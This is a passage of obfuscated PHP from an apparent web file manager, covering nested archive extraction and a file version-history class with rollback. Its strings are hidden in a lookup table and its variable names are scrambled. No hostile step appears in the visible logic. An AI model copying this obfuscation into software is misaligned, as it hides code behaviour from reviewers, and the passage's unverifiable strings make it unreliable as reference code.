$¼÷¨”º != $‹ó³şşÎ[1233] ? @json_decode($¼÷¨”º, !0) : -1; $«ñŠÎƒŸ = self::unzipPart($šÈ‡ËõŒ, $¼÷¨”º); if (!$«ñŠÎƒŸ || !IO::exist($«ñŠÎƒŸ[$‹ó³şşÎ[200]])) { show_json(LNG($‹ó³şşÎ[105]), !1); } $¦€€Ğ® = $«ñŠÎƒŸ[$‹ó³şşÎ[1234]][count($«ñŠÎƒŸ[$‹ó³şşÎ[1234]]) - 1]; if ($¦€€Ğ®[$‹ó³şşÎ[1235]] == -1 || substr($¦€€Ğ®[$‹ó³şşÎ[32]], -1, 1) == $‹ó³şşÎ[8]) { $Áıì£÷ = $«ñŠÎƒŸ[$‹ó³şşÎ[1236]] . rand_string(10) . $‹ó³şşÎ[8]; mk_dir($Áıì£÷); $í¯†èÃ÷ = count($«ñŠÎƒŸ[$‹ó³şşÎ[1234]]) == 1 ? IO::ext($šÈ‡ËõŒ) : get_path_ext($«ñŠÎƒŸ[$‹ó³şşÎ[200]]); $¨ÆğÛËÄ = KodArchive::extract(self::iconvSystem($«ñŠÎƒŸ[$‹ó³şşÎ[200]]), $Áıì£÷, $¦€€Ğ®[$‹ó³şşÎ[1235]], $’öÆØƒ“, $í¯†èÃ÷); self::unzipErrorCheck($¨ÆğÛËÄ, array($‹ó³şşÎ[1237], $šÈ‡ËõŒ, $í¯†èÃ÷, $ªÔïàš, $«ñŠÎƒŸ)); Hook::trigger($‹ó³şşÎ[1238], $Áıì£÷); recursion_dir($Áıì£÷, $µÂæéôÅ, $›¢°‚ºŞ, 0); $Ùôşèìˆ = array_merge($µÂæéôÅ, $›¢°‚ºŞ); $Ş™Œ»š = array(); foreach ($Ùôşèìˆ as $‹Âéäîê) { $›ÖÜà¢ª = IO::move(self::iconvApp($‹Âéäîê), $ªÔïàš, $ø„¹ÎÉ); if ($›ÖÜà¢ª) { $Ş™Œ»š[] = $›ÖÜà¢ª; } } del_dir($Áıì£÷); } else { $›ÖÜà¢ª = IO::move($«ñŠÎƒŸ[$‹ó³şşÎ[200]], $ªÔïàš, $ø„¹ÎÉ, get_path_this($¦€€Ğ®[$‹ó³şşÎ[32]])); if ($›ÖÜà¢ª) { $Ş™Œ»š[] = $›ÖÜà¢ª; } } return $Ş™Œ»š ? $Ş™Œ»š : !1; } public static function unzipList($Øà·ÈÛº) { $¤î†ëŸ† =& $_SERVER[…É¦À–]; $Ôâ×«˜† = isset($Øà·ÈÛº[$¤î†ëŸ†[1239]]) ? $Øà·ÈÛº[$¤î†ëŸ†[1239]] : !1; $¯÷‡áñî = isset($Øà·ÈÛº[$¤î†ëŸ†[1235]]) ? @json_decode($Øà·ÈÛº[$¤î†ëŸ†[1235]], !0) : -1; $Ä™æòÜ­ = self::unzipPart($Øà·ÈÛº[$¤î†ëŸ†[84]], $¯÷‡áñî); if (!$Ä™æòÜ­ || !IO::exist($Ä™æòÜ­[$¤î†ëŸ†[200]])) { show_json(LNG($¤î†ëŸ†[105]), !1); } $ˆŒ­ÑÔÕ = $Ä™æòÜ­[$¤î†ëŸ†[1234]][count($Ä™æòÜ­[$¤î†ëŸ†[1234]]) - 1]; $¼â´¾çë = in_array(IO::ext($Ä™æòÜ­[$¤î†ëŸ†[200]]), array($¤î†ëŸ†[342], $¤î†ëŸ†[1240], $¤î†ëŸ†[1241], $¤î†ëŸ†[1242], $¤î†ëŸ†[1243], $¤î†ëŸ†[1244])); if (!$Ôâ×«˜† && ($ˆŒ­ÑÔÕ[$¤î†ëŸ†[1235]] == -1 || $¼â´¾çë)) { $ô·¾¿° = $Ä™æòÜ­[$¤î†ëŸ†[1236]] . get_path_this($Ä™æòÜ­[$¤î†ëŸ†[200]]) . $¤î†ëŸ†[1245]; if (!IO::exist($ô·¾¿°)) { $³Çôš = $ˆŒ­ÑÔÕ[$¤î†ëŸ†[1235]] == -1 ? get_path_ext(IO::pathThis($Øà·ÈÛº[$¤î†ëŸ†[84]])) : get_path_ext($Ä™æòÜ­[$¤î†ëŸ†[200]]); $¯æå‹¡ü = KodArchive::listContent(self::iconvSystem($Ä™æòÜ­[$¤î†ëŸ†[200]]), !0, $³Çôš); self::unzipErrorCheck($¯æå‹¡ü, array($¤î†ëŸ†[1246], $Øà·ÈÛº, $Ä™æòÜ­)); @file_put_contents($ô·¾¿°, json_encode($¯æå‹¡ü[$¤î†ëŸ†[1247]])); } return @json_decode(IO::getContent($ô·¾¿°), !0); } IO::fileOut($Ä™æòÜ­[$¤î†ëŸ†[200]], $Ôâ×«˜†, get_path_this($ˆŒ­ÑÔÕ[$¤î†ëŸ†[32]])); die; } private static function zipFileList($‚ïé†À¼, $‘·øö¡± = false) { $„ë¸è› =& $_SERVER[…É¦À–]; $¼®ñ‘è = array(); foreach ($‚ïé†À¼ as $´ÕÛÔ¥) { $°¦ÀÄ¶¦ = $´ÕÛÔ¥[$„ë¸è›[84]]; if ($‘·øö¡±) { $°¦ÀÄ¶¦ = self::copy($´ÕÛÔ¥[$„ë¸è›[84]], $‘·øö¡±, $„ë¸è›[858]); } else { $´¾£Ë‚ = self::init($´ÕÛÔ¥[$„ë¸è›[84]]); if ($´¾£Ë‚->getType() == $„ë¸è›[106]) { $°¦ÀÄ¶¦ = $´¾£Ë‚->path; } } if ($°¦ÀÄ¶¦ && self::local()->exist($°¦ÀÄ¶¦)) { $¼®ñ‘è[$´ÕÛÔ¥[$„ë¸è›[84]]] = $°¦ÀÄ¶¦; } } if (!empty($¼®ñ‘è)) { return array_values($¼®ñ‘è); } show_json(LNG($„ë¸è›[1210]), !1); } private static function localFilePath($¹ı˜›É) { $ü“Ìø•± =& $_SERVER[…É¦À–]; $ïˆŠá¬– = KodIO::parse($¹ı˜›É); if ($ïˆŠá¬–[$ü“Ìø•±[33]] == KodIO::KOD_SOURCE) { $Ó““²¾İ = Model($ü“Ìø•±[865])->fileInfoGet(KodIO::sourceID($¹ı˜›É)); if (!$Ó““²¾İ[$ü“Ìø•±[84]]) { show_json($ü“Ìø•±[1248], !1); } $¹ı˜›É = $Ó““²¾İ[$ü“Ìø•±[84]]; } $Íã¾Øò´ = self::init($¹ı˜›É); if ($Íã¾Øò´->pathParse[$ü“Ìø•±[1196]]) { $¹ı˜›É = $Íã¾Øò´->pathParse[$ü“Ìø•±[1196]]; $Íã¾Øò´ = self::init($¹ı˜›É); } $Ö†ù÷ÆŸ = $Íã¾Øò´->getType(); if ($Ö†ù÷ÆŸ == $ü“Ìø•±[106] || $Ö†ù÷ÆŸ == $ü“Ìø•±[1249]) { if (!$Íã¾Øò´->exist($Íã¾Øò´->path)) { show_json(LNG($ü“Ìø•±[105]), !1); } return $Íã¾Øò´->path; } return !1; } public static function unzipPart($ ³´å¶î, $«ì—’šÎ = -1) { $“¬Á±¡à =& $_SERVER[…É¦À–]; $„î¯¾ğ½ = IO::pathThis($ ³´å¶î); if (!$«ì—’šÎ || $«ì—’šÎ == -1) { $ì¬Õ¯« = array(array($“¬Á±¡à[32] => $„î¯¾ğ½, $“¬Á±¡à[1235] => -1)); $ì¬Õ¯«[0][$“¬Á±¡à[1250]] = $ì¬Õ¯«[0][$“¬Á±¡à[32]]; } else { if (is_array($«ì—’šÎ)) { $ì¬Õ¯« = $«ì—’šÎ; $¢¤îŸĞÏ = count($ì¬Õ¯«) - 1; for ($ ‰Å¡ = 0; $ ‰Å¡ <= $¢¤îŸĞÏ; $ ‰Å¡++) { $Ï‹£€İ± = $ì¬Õ¯«[$ ‰Å¡]; $­¼•Òª‹ = get_path_this($Ï‹£€İ±[$“¬Á±¡à[32]]) . (checkExtSafe($Ï‹£€İ±[$“¬Á±¡à[32]]) ? $“¬Á±¡à[12] : $“¬Á±¡à[1251]); $ì¬Õ¯«[$ ‰Å¡][$“¬Á±¡à[1250]] = $“¬Á±¡à[1252] . intval($Ï‹£€İ±[$“¬Á±¡à[1235]]) . $“¬Á±¡à[415] . $­¼•Òª‹; if ($ ‰Å¡ == 0) { continue; } $ì¬Õ¯«[$ ‰Å¡][$“¬Á±¡à[1250]] = $ì¬Õ¯«[$ ‰Å¡ - 1][$“¬Á±¡à[1250]] . $“¬Á±¡à[1253] . $ì¬Õ¯«[$ ‰Å¡][$“¬Á±¡à[1250]]; } } } if (!is_array($ì¬Õ¯«) || count($ì¬Õ¯«) == 0) { return !1; } $ŸĞÚçè = $ì¬Õ¯«[count($ì¬Õ¯«) - 1]; if (!IO::exist($ ³´å¶î)) { return !1; } $ôÃ´£ = TEMP_FILES . $“¬Á±¡à[1254] . kodIO::hashPathSafe($ ³´å¶î) . $“¬Á±¡à[8]; $áÇ“ÔÛ = $ôÃ´£ . $ŸĞÚçè[$“¬Á±¡à[1250]]; mk_dir($ôÃ´£); file_put_contents(TEMP_FILES . $“¬Á±¡à[1229], $“¬Á±¡à[12]); if (IO::exist($áÇ“ÔÛ)) { return array($“¬Á±¡à[200] => $áÇ“ÔÛ, $“¬Á±¡à[1234] => $ì¬Õ¯«, $“¬Á±¡à[1236] => $ôÃ´£); } $„ë’ÒĞ¡ = self::localFilePath($ ³´å¶î); if (!$„ë’ÒĞ¡) { $„ë’ÒĞ¡ = $ôÃ´£ . $“¬Á±¡à[1255]; if (!IO::exist($„ë’ÒĞ¡)) { self::copy($ ³´å¶î, $ôÃ´£, !1, get_path_this($„ë’ÒĞ¡)); } } if (!$„ë’ÒĞ¡ || !IO::exist($„ë’ÒĞ¡)) { return !1; } if ($ŸĞÚçè[$“¬Á±¡à[1235]] == -1) { return array($“¬Á±¡à[200] => $„ë’ÒĞ¡, $“¬Á±¡à[1234] => $ì¬Õ¯«, $“¬Á±¡à[1236] => $ôÃ´£); } $ÖäÖ³Ï = $„ë’ÒĞ¡; foreach ($ì¬Õ¯« as $ ‰Å¡ => $Ï‹£€İ±) { if (!$Ï‹£€İ± || $Ï‹£€İ±[$“¬Á±¡à[1235]] == $“¬Á±¡à[1233]) { break; } if (substr($Ï‹£€İ±[$“¬Á±¡à[32]], -1, 1) == $“¬Á±¡à[8]) { break; } $ŸÄ¨®Û« = in_array(get_path_ext($Ï‹£€İ±[$“¬Á±¡à[1250]]), array($“¬Á±¡à[342], $“¬Á±¡à[1240], $“¬Á±¡à[1241], $“¬Á±¡à[1242], $“¬Á±¡à[1243], $“¬Á±¡à[1244])); $¥§æŞ÷à = $ ‰Å¡ == count($ì¬Õ¯«) - 1 && $ŸÄ¨®Û«; $§é†Ú‰ = $ôÃ´£ . $Ï‹£€İ±[$“¬Á±¡à[1250]]; $õİ†ŸàŞ = $ôÃ´£ . get_path_this($Ï‹£€İ±[$“¬Á±¡à[32]]); if (IO::exist($§é†Ú‰)) { $ÖäÖ³Ï = $§é†Ú‰; continue; } $¡Î»“¸† = $ ‰Å¡ == 0 ? get_path_ext($„î¯¾ğ½) : get_path_ext($ÖäÖ³Ï); $¦­ã€Ã— = KodArchive::extract(self::iconvSystem($ÖäÖ³Ï), $ôÃ´£, $Ï‹£€İ±[$“¬Á±¡à[1235]], $òÒş®Á‘, $¡Î»“¸†); self::unzipErrorCheck($¦­ã€Ã—, array($“¬Á±¡à[1256], $ ³´å¶î, $ì¬Õ¯«, $Ï‹£€İ±, $§é†Ú‰)); if (IO::exist($õİ†ŸàŞ)) { IO::rename($õİ†ŸàŞ, get_path_this($§é†Ú‰)); } $ÖäÖ³Ï = $§é†Ú‰; } $áÇ“ÔÛ = $ÖäÖ³Ï; return array($“¬Á±¡à[200] => $ÖäÖ³Ï, $“¬Á±¡à[1234] => $ì¬Õ¯«, $“¬Á±¡à[1236] => $ôÃ´£); } private static function unzipErrorCheck($çİÜ®‡, $†åÜ¦ = false) { $Ê§¯¶¢Ê =& $_SERVER[…É¦À–]; if ($çİÜ®‡[$Ê§¯¶¢Ê[1257]]) { return !0; } write_log(array($Ê§¯¶¢Ê[1258], $çİÜ®‡, $†åÜ¦), $Ê§¯¶¢Ê[1259]); show_json($Ê§¯¶¢Ê[1260] . json_encode($çİÜ®‡[$Ê§¯¶¢Ê[1247]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ŒÜ‘¬ò =& $_SERVER[…É¦À–]; $›ø©Å«Ñ = $GLOBALS[$ŒÜ‘¬ò[6]][$ŒÜ‘¬ò[89]]; if ($›ø©Å«Ñ[$ŒÜ‘¬ò[1261]] != 1) { return; } if ($›ø©Å«Ñ[$ŒÜ‘¬ò[1262]] <= 0) { return; } if (isset($_REQUEST[$ŒÜ‘¬ò[1263]]) && $_REQUEST[$ŒÜ‘¬ò[1263]] == $ŒÜ‘¬ò[88]) { return; } Hook::bind($ŒÜ‘¬ò[1264], $ŒÜ‘¬ò[1265]); Hook::bind($ŒÜ‘¬ò[1266], $ŒÜ‘¬ò[1267]); Hook::bind($ŒÜ‘¬ò[1268], $ŒÜ‘¬ò[1269]); Hook::bind($ŒÜ‘¬ò[1270], $ŒÜ‘¬ò[1271]); Hook::bind($ŒÜ‘¬ò[1272], $ŒÜ‘¬ò[1273]); Hook::bind($ŒÜ‘¬ò[1274], $ŒÜ‘¬ò[1275]); } public static function eventBeforeUpload($é™ŒÏ§Ê) { if ($é™ŒÏ§Ê[3] && $é™ŒÏ§Ê[3] != REPEAT_REPLACE) { return; } $”Ê‚ºÖ = self::parsePath($é™ŒÏ§Ê[0]); if (!$”Ê‚ºÖ) { return; } self::add($”Ê‚ºÖ); } public static function eventBeforeEdit($òÚ­¥êö) { $šœÛüçÎ = self::parsePath($òÚ­¥êö[0]); if (!$šœÛüçÎ) { return; } self::add($šœÛüçÎ); } public static function eventBeforeCopyFile($–ÔºÙ¤, $À–éÙèÏ, $Ñ¾ãê, $«Ù»Ş¾©, $ÒªÈÖä¾, $Í¬µ¥„Š) { $şÍÀ‘Â× =& $_SERVER[…É¦À–]; if (isset($Ñ¾ãê->_data[$şÍÀ‘Â×[1200]]) && $Ñ¾ãê->_data[$şÍÀ‘Â×[1200]]) { return; } $ùòùøã = $Ñ¾ãê->getPathOuter($«Ù»Ş¾©); $©‹±şçó = self::parsePath($ùòùøã); if (!$©‹±şçó) { return; } self::add($©‹±şçó); } public static function eventBeforeRename($²û³®Å¾) { $Şş’­şß =& $_SERVER[…É¦À–]; $êô’Óí» = self::parsePath($²û³®Å¾[0]); if (!$êô’Óí») { return; } $ûúËÒÙ = self::checkInHistory($êô’Óí»); if (!$ûúËÒÙ) { return; } if ($ûúËÒÙ[$Şş’­şß[33]] == $Şş’­şß[200]) { $šàåßŸ½ = self::listData($êô’Óí»); if ($šàåßŸ½ && $šàåßŸ½[$Şş’­şß[398]]) { self::moveHistory($êô’Óí», $²û³®Å¾[1]); } } else { IO::rename($ûúËÒÙ[$Şş’­şß[84]], $²û³®Å¾[1]); } } public static function eventBeforeMove($»ñŞ“Ş‡) { $ÔÏò—äğ =& $_SERVER[…É¦À–]; $ªàŸéš¤ = self::parsePath($»ñŞ“Ş‡[0]); if (!$ªàŸéš¤) { return; } $Ãññ‡Œ = self::parsePath($»ñŞ“Ş‡[1]); if (!$Ãññ‡Œ) { return; } $³¸é¶ Ş = $»ñŞ“Ş‡[3]; $¤¹±Ÿ¿Í = self::checkInHistory($ªàŸéš¤); if (!$¤¹±Ÿ¿Í) { return; } $–ôŞª€´ = self::pathHistory($Ãññ‡Œ); if ($¤¹±Ÿ¿Í[$ÔÏò—äğ[33]] == $ÔÏò—äğ[200]) { $úƒÑÛ¦£ = self::listData($ªàŸéš¤); $†ËÍñˆÄ = rtrim($Ãññ‡Œ, $ÔÏò—äğ[8]) . $ÔÏò—äğ[8] . ($³¸é¶ Ş ? $³¸é¶ Ş : get_path_this($ªàŸéš¤)); $À¬ãçÚÔ = self::listData($†ËÍñˆÄ); if ($úƒÑÛ¦£ && $úƒÑÛ¦£[$ÔÏò—äğ[398]] && $À¬ãçÚÔ && $À¬ãçÚÔ[$ÔÏò—äğ[398]]) { return self::clear($ªàŸéš¤); } if ($úƒÑÛ¦£ && $úƒÑÛ¦£[$ÔÏò—äğ[398]]) { self::moveHistory($ªàŸéš¤, $³¸é¶ Ş, $–ôŞª€´); } } else { IO::move($¤¹±Ÿ¿Í[$ÔÏò—äğ[84]], $–ôŞª€´, !1, $³¸é¶ Ş); self::clearEmptyFolder(IO::pathFather($¤¹±Ÿ¿Í[$ÔÏò—äğ[84]])); } } public static function eventAfterRemove($Œ èÔü, $‚µõô’Û) { $ğÄ¯È¡ =& $_SERVER[…É¦À–]; if (!$‚µõô’Û) { return; } $©Éˆüºê = self::parsePath($Œ èÔü[0]); if (!$©Éˆüºê) { return; } $ˆ‚Å•Ö® = self::checkInHistory($©Éˆüºê); if (!$ˆ‚Å•Ö®) { return; } if ($ˆ‚Å•Ö®[$ğÄ¯È¡[33]] == $ğÄ¯È¡[200]) { $ŠšÆ » = self::listData($©Éˆüºê, !1); if ($ŠšÆ » && $ŠšÆ »[$ğÄ¯È¡[398]]) { self::clear($©Éˆüºê, !1); } } else { IO::remove($ˆ‚Å•Ö®[$ğÄ¯È¡[84]]); self::clearEmptyFolder(IO::pathFather($ˆ‚Å•Ö®[$ğÄ¯È¡[84]])); } } private static function checkInHistory($şëÈÅøÒ) { $ßÇåÌ™Ø = self::pathHistory($şëÈÅøÒ); if (!IO::exist($ßÇåÌ™Ø)) { $ßÇåÌ™Ø .= $_SERVER[…É¦À–][1276]; } return IO::exist($ßÇåÌ™Ø) ? IO::info($ßÇåÌ™Ø) : !1; } private static function parsePath($¨ÒÚÜ²ö) { $”¶×á›é =& $_SERVER[…É¦À–]; if (!$¨ÒÚÜ²ö) { return !1; } if ($GLOBALS[$”¶×á›é[1277]]) { return; } $°§¸´–ï = KodIO::parse($¨ÒÚÜ²ö); $¾³ª½Ó¡ = $°§¸´–ï[$”¶×á›é[33]]; $†Ëşäû = !$¾³ª½Ó¡ || $¾³ª½Ó¡ == KodIO::KOD_IO || $¾³ª½Ó¡ == KodIO::KOD_SHARE_ITEM; if (!$†Ëşäû || !$°§¸´–ï[$”¶×á›é[1278]]) { return !1; } if (substr($¨ÒÚÜ²ö, 0, strlen(DATA_PATH . $”¶×á›é[1279])) == DATA_PATH . $”¶×á›é[1279]) { return !1; } if ($¾³ª½Ó¡ == KodIO::KOD_SHARE_ITEM) { $¾ƒƒè‡ñ = IO::init($¨ÒÚÜ²ö); if ($¾ƒƒè‡ñ->pathParse[$”¶×á›é[1196]]) { return self::parsePath($¾ƒƒè‡ñ->pathParse[$”¶×á›é[1196]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ùÅáñ¯ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $”¶×á›é[1280]); foreach ($ùÅáñ¯ as $ÈŠıÖ­) { if (!$¾³ª½Ó¡ && substr($¨ÒÚÜ²ö, 0, strlen($ÈŠıÖ­)) == $ÈŠıÖ­) { return !1; } } self::log($GLOBALS[$”¶×á›é[1191]] . $”¶×á›é[1281] . $¨ÒÚÜ²ö); return $¨ÒÚÜ²ö; } private static function pathHistory($ï¿˜‰ÁÕ) { $€Ã§“¿ =& $_SERVER[…É¦À–]; $íŸ¡¹ë¤ = self::$_historyBase . ltrim(KodIO::clear($ï¿˜‰ÁÕ), $€Ã§“¿[8]); $íŸ¡¹ë¤ = str_replace(array($€Ã§“¿[1282]), array($€Ã§“¿[1283]), $íŸ¡¹ë¤); return $íŸ¡¹ë¤; } public static function log($äªíµ·) { } public static function historyCount($Ê¾î˜) { $£¨ëçê =& $_SERVER[…É¦À–]; $¿ô¯»ã¡ = array(); $÷ÏŞÍğş = array(); foreach ($Ê¾î˜ as $˜…ÛØäí) { $ÑÌÕ´¤† = get_path_father($˜…ÛØäí); if (!$÷ÏŞÍğş[$ÑÌÕ´¤†]) { $÷ÏŞÍğş[$ÑÌÕ´¤†] = array(); } $÷ÏŞÍğş[$ÑÌÕ´¤†][] = get_path_this($˜…ÛØäí); } foreach ($÷ÏŞÍğş as $ÑÌÕ´¤† => $˜–ßÀ‘“) { $Òë¹ıÀö = self::parsePath($ÑÌÕ´¤†); if (!$Òë¹ıÀö) { continue; } foreach ($˜–ßÀ‘“ as $ÉïäÑË³) { $şÍ›Š§à = self::listData(rtrim($Òë¹ıÀö, $£¨ëçê[8]) . $£¨ëçê[8] . $ÉïäÑË³, !1); if ($şÍ›Š§à && $şÍ›Š§à[$£¨ëçê[398]]) { $¿ô¯»ã¡[rtrim($ÑÌÕ´¤†, $£¨ëçê[8]) . $£¨ëçê[8] . $ÉïäÑË³] = count($şÍ›Š§à[$£¨ëçê[398]]); } } } return $¿ô¯»ã¡; } public static function add($Ïü‚ñ÷•) { $¼üÓ‰“š =& $_SERVER[…É¦À–]; $ĞßŒ£“É = self::listData($Ïü‚ñ÷•); if (!$ĞßŒ£“É) { return; } $õ‹Íôƒô = Model($¼üÓ‰“š[810])->get($¼üÓ‰“š[1284]); $œŒ™õİş = $GLOBALS[$¼üÓ‰“š[6]][$¼üÓ‰“š[89]][$¼üÓ‰“š[1262]]; $’®Š—¬À = $õ‹Íôƒô == $¼üÓ‰“š[1285] ? min(5, $œŒ™õİş) : $œŒ™õİş; if ($œŒ™õİş <= 0) { return; } $ïŞ†Ş„ = IO::info($Ïü‚ñ÷•); $îíÈŞ¨± = $ĞßŒ£“É[$¼üÓ‰“š[398]]; if ($ïŞ†Ş„[$¼üÓ‰“š[76]] == 0) { return; } if ($ïŞ†Ş„[$¼üÓ‰“š[76]] >= 1024 * 1024 * 500) { return !1; } $›±Œõ¬ = IO::hashSimple($Ïü‚ñ÷•); if ($îíÈŞ¨± && $îíÈŞ¨±[0][$¼üÓ‰“š[177]] == $›±Œõ¬) { return !0; } if (array_key_exists($¼üÓ‰“š[203], $ïŞ†Ş„) && !$ïŞ†Ş„[$¼üÓ‰“š[203]]) { return !1; } $š®á¢¼± = short_id(time()); $ÑÇõ§¬İ = array($¼üÓ‰“š[428] => $š®á¢¼±, $¼üÓ‰“š[177] => $›±Œõ¬, $¼üÓ‰“š[32] => $ïŞ†Ş„[$¼üÓ‰“š[32]] . $¼üÓ‰“š[10] . date($¼üÓ‰“š[1286]) . rand_string(1), $¼üÓ‰“š[76] => $ïŞ†Ş„[$¼üÓ‰“š[76]], $¼üÓ‰“š[483] => USER_ID, $¼üÓ‰“š[201] => time(), $¼üÓ‰“š[1287] => $¼üÓ‰“š[12]); IO::mkdir($ĞßŒ£“É[$¼üÓ‰“š[1288]]); $ù¬ñ¼À£ = IO::copy($Ïü‚ñ÷•, $ĞßŒ£“É[$¼üÓ‰“š[1288]], !1, $ÑÇõ§¬İ[$¼üÓ‰“š[32]]); if (!$ù¬ñ¼À£) { self::clearEmptyFolder($ĞßŒ£“É[$¼üÓ‰“š[1288]]); return !1; } array_unshift($îíÈŞ¨±, $ÑÇõ§¬İ); if (count($îíÈŞ¨±) > $’®Š—¬À) { $«‘¬Å = array_slice($îíÈŞ¨±, $’®Š—¬À); foreach ($«‘¬Å as $Ù÷Š„Á) { IO::remove($ĞßŒ£“É[$¼üÓ‰“š[1288]] . $Ù÷Š„Á[$¼üÓ‰“š[32]]); } $îíÈŞ¨± = array_slice($îíÈŞ¨±, 0, $’®Š—¬À); } return self::saveData($ĞßŒ£“É[$¼üÓ‰“š[1289]], $îíÈŞ¨±); } public static function remove($š÷ µíá, $©ô¿´ÕË) { $ßèµûâ =& $_SERVER[…É¦À–]; $ÏĞÚÁÄ¸ = self::listData($š÷ µíá); $´¤±ıºî = array(); if (!$ÏĞÚÁÄ¸) { return !1; } foreach ($ÏĞÚÁÄ¸[$ßèµûâ[398]] as $®æ©©«“) { if ($®æ©©«“[$ßèµûâ[428]] == $©ô¿´ÕË) { IO::remove($ÏĞÚÁÄ¸[$ßèµûâ[1288]] . $®æ©©«“[$ßèµûâ[32]]); continue; } $´¤±ıºî[] = $®æ©©«“; } return self::saveData($ÏĞÚÁÄ¸[$ßèµûâ[1289]], $´¤±ıºî); } public static function clear($ÅÑµÊò, $ñÖÁ’§Ÿ = true) { $Ã°§û¡ß =& $_SERVER[…É¦À–]; $±Éâ§üå = self::listData($ÅÑµÊò, $ñÖÁ’§Ÿ); if (!$±Éâ§üå) { return !1; } foreach ($±Éâ§üå[$Ã°§û¡ß[398]] as $Ø‚¼Ô—Ñ) { IO::remove($±Éâ§üå[$Ã°§û¡ß[1288]] . $Ø‚¼Ô—Ñ[$Ã°§û¡ß[32]]); } return self::saveData($±Éâ§üå[$Ã°§û¡ß[1289]], array()); } public static function moveHistory($ºò¾ÀãŞ, $Ôõ­Ÿã = '', $ñ…ŸĞİã = '') { $‚°ñï¥ =& $_SERVER[…É¦À–]; $ÖäÈ¹…  = self::listData($ºò¾ÀãŞ, !1); if (!$ÖäÈ¹…  || !$ÖäÈ¹… [$‚°ñï¥[398]]) { return !1; } $ùåöÄÅö = $‚°ñï¥[1276]; $Ôõ­Ÿã = $Ôõ­Ÿã ? $Ôõ­Ÿã : get_path_this($ºò¾ÀãŞ); $ñ…ŸĞİã = $ñ…ŸĞİã ? $ñ…ŸĞİã : $ÖäÈ¹… [$‚°ñï¥[1288]]; $ëÏéê©µ = substr(get_path_this($ÖäÈ¹… [$‚°ñï¥[1289]]), 0, -strlen($ùåöÄÅö)); foreach ($ÖäÈ¹… [$‚°ñï¥[398]] as $·¨˜Ü” => $ÉÈèßµ¢) { $½ÑóÜë = $Ôõ­Ÿã . substr($ÉÈèßµ¢[$‚°ñï¥[32]], strlen($ëÏéê©µ)); $ã¯‚Ïø = IO::move($ÖäÈ¹… [$‚°ñï¥[1288]] . $ÉÈèßµ¢[$‚°ñï¥[32]], $ñ…ŸĞİã, !1, $½ÑóÜë); if ($ã¯‚Ïø) { $ÖäÈ¹… [$‚°ñï¥[398]][$·¨˜Ü”][$‚°ñï¥[32]] = $½ÑóÜë; } } $ÖäÈ¹… [$‚°ñï¥[1289]] = IO::move($ÖäÈ¹… [$‚°ñï¥[1289]], $ñ…ŸĞİã, !1, $Ôõ­Ÿã . $ùåöÄÅö); self::saveData($ÖäÈ¹… [$‚°ñï¥[1289]], $ÖäÈ¹… [$‚°ñï¥[398]]); self::clearEmptyFolder($ÖäÈ¹… [$‚°ñï¥[1288]]); } public static function rollback($ÅŒ²Í¥¿, $¡ó‰ß£) { $·Í–—¦å =& $_SERVER[…É¦À–]; $˜©Ì€µØ = self::listData($ÅŒ²Í¥¿); if (!$˜©Ì€µØ) { return; } $ĞÅ×¡» = IO::info($ÅŒ²Í¥¿); foreach ($˜©Ì€µØ[$·Í–—¦å[398]] as $ÎôñìıÁ => $¼á™•÷) { if ($¼á™•÷[$·Í–—¦å[428]] == $¡ó‰ß£) { self::add($ÅŒ²Í¥¿); $İú‰ÏÂ¥ = $˜©Ì€µØ[$·Í–—¦å[1288]] . $¼á™•÷[$·Í–—¦å[32]]; $˜Ù„¹… = IO::copy($İú‰ÏÂ¥, IO::pathFather($ÅŒ²Í¥¿), REPEAT_REPLACE, $ĞÅ×¡»[$·Í–—¦å[32]]); if ($˜Ù„¹…) { self::remove($ÅŒ²Í¥¿, $¡ó‰ß£); } return $˜Ù„¹…; } } return !1; } public static function setDetail($Ë˜ÕÉá, $Šµ˜÷‹, $µ·ËâÕÄ) { $Êù€¶œç =& $_SERVER[…É¦À–]; $î¶‹öİä = self::listData($Ë˜ÕÉá); if (!$î¶‹öİä) { return; } foreach ($î¶‹öİä[$Êù€¶œç[398]] as $ô—îá½‰ => $ÓºŞ­§â) { if ($ÓºŞ­§â[$Êù€¶œç[428]] == $Šµ˜÷‹) { $î¶‹öİä[$Êù€¶œç[398]][$ô—îá½‰][$Êù€¶œç[1287]] = $µ·ËâÕÄ; self::saveData($î¶‹öİä[$Êù€¶œç[1289]], $î¶‹öİä[$Êù€¶œç[398]]); return !0; } } return !1; } public static function fileInfo($»¥šÆ¬İ, $ë˜ºÔ±ï) { $‡àšî¿ş =& $_SERVER[…É¦À–]; $ªØîàæ = self::listData($»¥šÆ¬İ); if (!$ªØîàæ) { show_json(LNG($‡àšî¿ş[105]), !1); } $şÅª±½™ = $‡àšî¿ş[12]; foreach ($ªØîàæ[$‡àšî¿ş[398]] as $œÑ‘‹Œ => $Ò“ÔÓÕ) { if ($Ò“ÔÓÕ[$‡àšî¿ş[428]] != $ë˜ºÔ±ï) { continue; } $şÅª±½™ = $ªØîàæ[$‡àšî¿ş[1288]] . $Ò“ÔÓÕ[$‡àšî¿ş[32]]; break; } if (!$şÅª±½™) { show_json(LNG($‡àšî¿ş[105]), !1); } return IO::info($şÅª±½™); } public static function fileOut($•áç‚Å, $…ãÇñ˜Ş, $²–çüÏ = false) { $ê¶©Â¦ =& $_SERVER[…É¦À–]; $¶ç£»•ø = self::fileInfo($•áç‚Å, $…ãÇñ˜Ş); $Œ£ªÑ¹ª =& $GLOBALS[$ê¶©Â¦[7]]; $²–çüÏ = isset($Œ£ªÑ¹ª[$ê¶©Â¦[1239]]) && $Œ£ªÑ¹ª[$ê¶©Â¦[1239]] == 1; if (isset($Œ£ªÑ¹ª[$ê¶©Â¦[33]]) && $Œ£ªÑ¹ª[$ê¶©Â¦[33]] == $ê¶©Â¦[1290]) { return IO::fileOutImage($¶ç£»•ø[$ê¶©Â¦[84]], $Œ£ªÑ¹ª[$ê¶©Â¦[1291]]); } IO::fileOut($¶ç£»•ø[$ê¶©Â¦[84]], $²–çüÏ, get_path_this($•áç‚Å)); } public static function listData($÷çÌ±–ô, $ÀÙ¤ğ² = true) { $åí‡öÃµ =& $_SERVER[…É¦À–]; if ($ÀÙ¤ğ² && !IO::exist($÷çÌ±–ô)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($÷çÌ±–ô, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $êËıª÷Ş = 